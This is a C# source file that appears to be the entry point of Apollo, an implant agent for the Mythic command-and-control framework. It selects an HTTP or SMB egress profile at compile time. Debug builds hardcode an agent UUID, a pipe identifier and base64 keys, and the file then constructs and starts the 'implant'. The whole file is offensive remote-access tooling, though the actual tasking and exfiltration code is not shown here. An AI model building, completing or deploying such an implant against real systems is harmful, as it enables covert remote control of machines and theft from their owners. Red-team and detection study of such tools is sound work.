#define C2PROFILE_NAME_UPPER
// supported profiles get undefined
#if DEBUG
#undef SMBSERVER
#undef HTTP
// then we define the c2 profile we want to use on compilation
#define HTTP
#define SMBSERVER
#endif

using IPC;
using Mythic.C2Profiles;
using System;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;

namespace Apollo
{
    class Apollo
    {

#if DEBUG
        public static string AgentUUID = "b8e8bfef-d2e1-48c4-9485-39fc79aa34d3";
#endif

        [STAThread]
        static void Main(string[] args)
        {
#if HTTP
#if DEBUG
            DefaultProfile profile;
            if (args.Length == 2)
            {
                profile = new DefaultProfile(args[0], args[1]);

            }
            else
            {
                profile = new DefaultProfile(AgentUUID, "q1adRJ68AL9GQeyjhIYPx0mklcnUEh+mClxYamy+NdQ=");
            }
#else
            DefaultProfile profile = new DefaultProfile();
#endif
#elif SMBSERVER
#if DEBUG
            SMBServerProfile profile = new SMBServerProfile("q5bptea4-2t2v-0e6g-qogh-rmoce5fr6gzq", AgentUUID, "65U+1Y1RXuE2AC7oOyYC7PnWtDdraaECgG6u1wvMpSI=");
#else
            SMBServerProfile profile = new SMBServerProfile();
#endif
#else
#error NO VALID EGRESS PROFILE SELECTED
#endif

            Agent implant = new Agent(profile);
            implant.Start();
        }
    }

}
